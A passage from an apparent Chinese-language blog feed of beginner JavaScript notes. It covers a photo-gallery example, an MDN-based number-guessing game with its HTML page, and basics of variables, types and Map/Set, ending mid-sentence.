class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-tag">body</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.full-img</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">480px</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.overlay</span>, <span class="selector-class">.dark</span>, <span class="selector-class">.light</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.overlay</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">480px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">top</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.dark</span>,<span class="selector-class">.light</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">top</span>: <span class="number">2px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">left</span>: <span class="number">2px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.6</span>);</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.thumb-bar</span> <span class="selector-tag">img</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">20%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="css">            <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>照片库<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;full-img&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;displayed-img&quot;</span> <span class="attr">src</span>=<span class="string">&quot;images/1.jpg&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;overlay&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;light&quot;</span>&gt;</span>变暗<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;thumb-bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> thumbar = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.thumb-bar&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> display = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.displayed-img&#x27;</span>)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> overlay = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.overlay&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> btn = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.light&#x27;</span>);</span></span><br><span class="line"><span class="javascript"> </span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">1</span>; i&lt;<span class="number">3</span>; i++)&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> myImg = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            myImg.setAttribute(<span class="string">&#x27;src&#x27;</span>,<span class="string">&#x27;images/&#x27;</span>+i+<span class="string">&#x27;&#x27;</span>+<span class="string">&#x27;.jpg&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            myImg.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">let</span> src = e.target.getAttribute(<span class="string">&#x27;src&#x27;</span>);</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&#x27;得到图片路径：&#x27;</span>+src);</span></span><br><span class="line"><span class="javascript">                srcChange(src);</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">            thumbar.appendChild(myImg);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">srcChange</span>(<span class="params">src</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            display.setAttribute(<span class="string">&#x27;src&#x27;</span>,src);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        btn.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span>(btn.getAttribute(<span class="string">&#x27;class&#x27;</span>) !== <span class="string">&#x27;light&#x27;</span>)&#123;</span></span><br><span class="line"><span class="javascript">                btn.setAttribute(<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;light&#x27;</span>);</span></span><br><span class="line"><span class="javascript">                overlay.style.backgroundColor = <span class="string">&#x27;rgba(0,0,0,0)&#x27;</span>;</span></span><br><span class="line"><span class="javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                btn.setAttribute(<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;dark&#x27;</span>);</span></span><br><span class="line"><span class="javascript">                overlay.style.backgroundColor = <span class="string">&#x27;rgba(0,0,0,0.6)&#x27;</span>;            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;  </span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 事件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript基础</title>
      <link href="/Front-end/JavaScript/base.html"/>
      <url>/Front-end/JavaScript/base.html</url>
      
        <content type="html"><![CDATA[<p>JavaScript（简称“JS”） 是一种具有<a href="https://baike.baidu.com/item/函数/301912">函数</a>优先的<a href="https://baike.baidu.com/item/轻量级/22359343">轻量级</a>，解释型或即时编译型的<a href="https://baike.baidu.com/item/编程语言/9845131">编程语言</a>。虽然它是作为开发Web页面的<a href="https://baike.baidu.com/item/脚本语言/1379708">脚本语言</a>而出名的，但是它也被用到了很多非浏览器环境中，JavaScript 基于原型<a href="https://baike.baidu.com/item/编程/139828">编程</a>、多范式的动态脚本语言，并且支持<a href="https://baike.baidu.com/item/面向对象/2262089">面向对象</a>、命令式和声明式（如<a href="https://baike.baidu.com/item/函数式编程/4035031">函数式编程</a>）风格。 ——百度百科</p><span id="more"></span><h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><p>先展示一段js代码，从<a href="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/First_steps/A_first_splash">MDN</a>扒下来的，包含了最基本的用法</p><figure class="highlight js"><figcaption><span>guessNumberGame.js &gt;folded</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 游戏逻辑：</span></span><br><span class="line"><span class="comment">    随机生成一个 100 以内的自然数。</span></span><br><span class="line"><span class="comment">    记录玩家当前的轮数。从 1 开始。</span></span><br><span class="line"><span class="comment">    为玩家提供一种猜测数字的方法。</span></span><br><span class="line"><span class="comment">    一旦有结果提交，先将其记录下来，以便用户可以看到他们先前的猜测。</span></span><br><span class="line"><span class="comment">    然后检查它是否正确。</span></span><br><span class="line"><span class="comment">    如果正确：</span></span><br><span class="line"><span class="comment">        显示祝贺消息。</span></span><br><span class="line"><span class="comment">        阻止玩家继续猜测（这会使游戏混乱）。</span></span><br><span class="line"><span class="comment">        显示控件允许玩家重新开始游戏。</span></span><br><span class="line"><span class="comment">    如果出错，并且玩家有剩余轮次：</span></span><br><span class="line"><span class="comment">        告诉玩家他们错了。</span></span><br><span class="line"><span class="comment">        允许他们输入另一个猜测。</span></span><br><span class="line"><span class="comment">        轮数加 1。</span></span><br><span class="line"><span class="comment">    如果出错，并且玩家没有剩余轮次：</span></span><br><span class="line"><span class="comment">        告诉玩家游戏结束。</span></span><br><span class="line"><span class="comment">        阻止玩家继续猜测（这会使游戏混乱）。</span></span><br><span class="line"><span class="comment">        显示控件允许玩家重新开始游戏。</span></span><br><span class="line"><span class="comment">    一旦游戏重启，确保游戏的逻辑和UI完全重置，然后返回步骤1。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//  创建随机数</span></span><br><span class="line"><span class="keyword">let</span> randomNumber = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*<span class="number">100</span>)+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 记录猜过的数</span></span><br><span class="line"><span class="keyword">const</span> guesses = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.guesses&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> lastResult = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.lastResult&#x27;</span>)</span><br><span class="line"><span class="comment">// 告诉猜高还是低</span></span><br><span class="line"><span class="keyword">const</span> lowOrHi = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.lowOrHi&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> guessSubmit = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.guessSubmit&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> guessField = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.guessField&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> guessCount = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> resetButton;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkGuess</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> userGuess = <span class="built_in">Number</span>(guessField.value);</span><br><span class="line">    <span class="keyword">if</span>(guessCount === <span class="number">1</span>)&#123;</span><br><span class="line">        guesses.textContent = <span class="string">&#x27;上次猜的数:&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    guesses.textContent += userGuess+<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    guesses.style.backgroundColor = <span class="string">&#x27;yellow&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(userGuess === randomNumber)&#123;</span><br><span class="line">        lastResult.textContent = <span class="string">&#x27;恭喜你！猜对了&#x27;</span>;</span><br><span class="line">        lastResult.style.backgroundColor = <span class="string">&#x27;green&#x27;</span>;</span><br><span class="line">        lowOrHi.textContent = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        setGameOver();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(guessCount === <span class="number">5</span>)&#123;</span><br><span class="line">        lastResult.textContent = <span class="string">&#x27;Game over&#x27;</span>;</span><br><span class="line">        setGameOver();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        lastResult.textContent = <span class="string">&#x27;你猜错了！&#x27;</span>;</span><br><span class="line">        lastResult.style.backgroundColor = <span class="string">&#x27;red&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(userGuess &lt; randomNumber) &#123;</span><br><span class="line">          lowOrHi.textContent = <span class="string">&#x27;你猜低了！&#x27;</span>;</span><br><span class="line">          lowOrHi.style.backgroundColor = <span class="string">&#x27;green&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(userGuess &gt; randomNumber) &#123;</span><br><span class="line">          lowOrHi.textContent = <span class="string">&#x27;你猜高了&#x27;</span>;</span><br><span class="line">          lowOrHi.style.backgroundColor = <span class="string">&#x27;green&#x27;</span>;</span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    guessCount++;</span><br><span class="line">    guessField.value = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    guessField.focus();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setGameOver</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    guessField.disabled = <span class="literal">true</span>;</span><br><span class="line">    guessSubmit.disabled = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// 创建button</span></span><br><span class="line">    resetButton = <span class="built_in">document</span>.createElement(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line">    resetButton.textContent = <span class="string">&#x27;开始新游戏&#x27;</span>;</span><br><span class="line">    <span class="comment">// 添加到Html底部</span></span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(resetButton);</span><br><span class="line">    resetButton.addEventListener(<span class="string">&#x27;click&#x27;</span>,resetGame);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">resetGame</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    guessCount = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 选中&lt;div class=&#x27;resultParas&#x27;&gt;&lt;/div&gt;的所有p元素</span></span><br><span class="line">    <span class="keyword">const</span> resetParas = <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;.resultParas p&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span> ; i &lt; resetParas.length; i++) &#123;</span><br><span class="line">      resetParas[i].textContent = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//   取消重置按钮</span></span><br><span class="line">    resetButton.parentNode.remove </span><br><span class="line">    guessField.disabled = <span class="literal">false</span>;</span><br><span class="line">    guessSubmit.disabled = <span class="literal">false</span>;</span><br><span class="line">    guessField.value = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    guessField.focus();</span><br><span class="line">  </span><br><span class="line">    lastResult.style.backgroundColor = <span class="string">&#x27;white&#x27;</span>;</span><br><span class="line">    lowOrHi.style.backgroundColor = <span class="string">&#x27;white&#x27;</span>;</span><br><span class="line">    guesses.style.backgroundColor = <span class="string">&#x27;white&#x27;</span>;</span><br><span class="line">  </span><br><span class="line">    randomNumber = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">100</span>) + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">guessSubmit.addEventListener(<span class="string">&#x27;click&#x27;</span>,checkGuess);</span><br></pre></td></tr></table></figure><p>html</p><figure class="highlight html"><figcaption><span>test.html >folded</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;resultParas&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;guesses&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;lastResult&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;lowOrHi&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;guessField&quot;</span>&gt;</span>请猜数：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;guessField&quot;</span> <span class="attr">class</span>=<span class="string">&quot;guessField&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;确定&quot;</span> <span class="attr">class</span>=<span class="string">&quot;guessSubmit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./js/guessNumberGame.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>使用<code>let</code>来声明变量</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> age;</span><br></pre></td></tr></table></figure><p>初始化</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">age = <span class="number">19</span>;</span><br></pre></td></tr></table></figure><p>声明+初始化</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> age = <span class="number">19</span>;</span><br></pre></td></tr></table></figure><p>还有<code>var</code>也可以声明变量，他与<code>let</code>的区别如下</p><p>1.var的变量提升</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// true</span></span><br><span class="line">name = <span class="string">&#x27;manu&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> name;</span><br><span class="line"></span><br><span class="line"><span class="comment">//false</span></span><br><span class="line">name = <span class="string">&#x27;manu&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> name;</span><br></pre></td></tr></table></figure><p>2.var的多次声明</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//true</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;muyang&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;manu&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//false</span></span><br><span class="line"><span class="keyword">let</span> name = <span class="string">&#x27;muyang&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> name = <span class="string">&#x27;manu&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//true</span></span><br><span class="line"><span class="keyword">let</span> name = <span class="string">&#x27;muyang&#x27;</span>;</span><br><span class="line">name = <span class="string">&#x27;manu&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="命名规范"><a href="#命名规范" class="headerlink" title="命名规范"></a>命名规范</h3><ul><li>不能以下划线开头，它在js里由特殊意义</li><li>不能以数字开头</li><li>建议驼峰命名法</li><li>大小写敏感</li><li>不能与<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Lexical_grammar#Keywords">关键字</a>重名</li></ul><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><h4 id="Number"><a href="#Number" class="headerlink" title="Number"></a>Number</h4><p>js给一个变量赋值数字不需要声明类型，和python类似</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> age = <span class="number">19</span>;</span><br></pre></td></tr></table></figure><h4 id="String"><a href="#String" class="headerlink" title="String"></a>String</h4><p>定义字符串，单双引号都可以</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="string">&#x27;manu&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="Boolean"><a href="#Boolean" class="headerlink" title="Boolean"></a>Boolean</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> iAmPeople = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">let</span> result = <span class="number">1</span> &gt; <span class="number">3</span>;</span><br></pre></td></tr></table></figure><h4 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h4><p>和其他语言一样从0开始索引</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="keyword">let</span> array = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"><span class="keyword">let</span> arrayString = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问</span></span><br><span class="line">array[<span class="number">0</span>];</span><br><span class="line">arrayString[<span class="number">2</span>];</span><br></pre></td></tr></table></figure><h4 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h4><p>定义一个对象的多个属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ren = &#123;<span class="attr">name</span>:<span class="string">&#x27;muyang&#x27;</span>,<span class="attr">age</span>:<span class="number">19</span>&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(ren.age);</span><br></pre></td></tr></table></figure><p>js是动态类型语言，不需要指定类型，使用引号就是字符串，数字就代表number，可以使用<code>typeof</code>返回传递变量的类型</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="string">&#x27;shpherd&#x27;</span></span><br><span class="line"><span class="keyword">typeof</span> name;</span><br></pre></td></tr></table></figure><h2 id="Map-Set"><a href="#Map-Set" class="headerlink" title="Map Set"></a>Map Set</h2><p>ES6引入的，map就是键值对</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>([[<span class="string">&#x27;Michael&#x27;</span>, <span class="number">95</span>], [<span class="string">&#x27;Bob&#x27;</span>, <span class="number">75</span>], [<span class="string">&#x27;Tracy&#x27;</span>, <span class="number">85</span>]]);</span><br><span class="line"><span class="comment">// 获取值</span></span><br><span class="line">m.get(<span class="string">&#x27;Michael&#x27;</span>); <span class="comment">// 95</span></span><br><span class="line"><span class="comment">// 添加键值对</span></span><br><span class="line">m.set(<span class="string">&#x27;new&#x27;</span>,<span class="number">17</span>);</span><br><span class="line"><span class="comment">// 判断键是否存在</span></span><br><span class="line">m.has(<span class="string">&#x27;new&#x27;</span>);<span class="comment">// true</span></span><br><span class="line"><span class="comment">// 删除键</span></span><br><span class="line">m.delete(<span class="string">&#x27;new&#x27;</span>);</span><br></pre></td></tr></table></figure><p>set是key的集合，所以不能重复</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s1 = <span class="keyword">new</span> <span class="built_in">Set</span>(); <span class="comment">// 空Set</span></span><br><span class="line"><span class="keyword">var</span> s2 = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]); <span class="comment">// 含1, 2, 